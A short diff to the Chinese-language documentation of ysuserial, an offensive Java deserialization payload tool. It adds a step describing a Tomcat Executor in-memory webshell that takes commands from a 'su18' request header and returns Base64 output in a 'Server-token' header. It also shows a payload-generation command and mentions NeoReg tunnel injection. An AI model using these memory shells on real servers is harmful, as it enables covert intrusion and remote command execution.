@@ -350,6 +350,10 @@ java -jar ysuserial-0.6-su18-all.jar URLDNS 'all:xxxxxx.dns.log'
 
    ![iShot_2022-07-25_20.44.35](images/iShot_2022-07-25_20.44.35.png)
 
+5. 如果是 <font color="orange"> Tomcat Executor </font> 内存马，程序会从 Header 中的 `su18` 中读取待执行的命令，并将执行结果在 Header `Server-token` 进行 Base64encode 回显。
+
+   ![iShot_2022-08-04_15.52.15.png](images/iShot_2022-08-04_15.52.15.png)
+
 ## NeoReg 隧道类
 
 对于 TLNeoRegFromThread 注入 NeoReg 的隧道脚本。项目地址：https://github.com/L-codes/Neo-reGeorg
